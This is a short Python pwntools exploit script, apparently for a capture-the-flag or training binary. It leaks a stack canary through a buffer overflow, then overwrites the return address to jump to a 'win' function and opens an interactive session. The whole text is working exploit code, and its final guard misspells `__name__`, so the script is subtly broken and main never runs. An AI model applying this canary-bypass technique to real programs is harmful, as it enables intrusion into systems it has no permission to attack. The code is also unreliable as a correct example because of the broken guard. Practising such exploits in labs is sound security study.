from pwn import *

bin_file = './sbof_leak_w_ssp'
context(os = 'linux', arch = 'amd64')

binf = ELF(bin_file)
addr_win = binf.functions['win'].address

def attack(conn, ** kwargs):
    conn.sendafter('>> ', b'a'*0x18 + b'!')
    conn.recvuntil('a!')
    canary = u64(b'\x00' + conn.recv(7))
    info('canary = 0x{:08x}'.format(canary))

    exploit  = b'a'*0x18
    exploit += p64(canary)
    exploit += p64(0xdeadbeef)
    exploit += p64(addr_win)
    conn.sendafter('>> ', exploit)


def main():
    conn = process(bin_file)
    attack(conn)
    conn.interactive()


if __name == '__main__':
    main()


